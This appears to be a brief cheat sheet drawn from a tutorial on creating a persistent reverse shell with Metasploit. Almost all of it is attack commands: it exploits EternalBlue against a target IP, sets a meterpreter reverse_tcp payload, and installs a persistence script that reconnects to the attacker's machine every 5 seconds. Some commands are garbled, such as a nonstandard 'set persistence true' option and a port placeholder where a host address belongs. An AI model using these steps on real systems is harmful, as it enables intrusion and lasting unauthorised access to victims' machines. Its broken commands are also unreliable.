# Creating a Persistent Reverse Shell with Metasploit in Kali Linux

https://www.geeksforgeeks.org/creating-a-persistent-reverse-shell-with-metasploit-in-kali-linux/

```sh
msfconsole
search windows
use windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.166.240
set PAYLOAD windows/meterpreter/reverse_tcp
set LPORT <port>

> To create a persistent reverse shell, you will need to set up a persistence script that will run every time the target machine starts up. To do this, use the set command to set the “persistence” option to “true”. For example:
 
set persistence true
exploit

> To make the reverse shell persistent, you will need to run the persistence script by typing the following command in the meterpreter session:

run persistence -U -i 5 -p 4444 -r <LPORT>

# This will set up a persistent reverse shell that will connect back to your Kali Linux machine every 5 seconds.
```
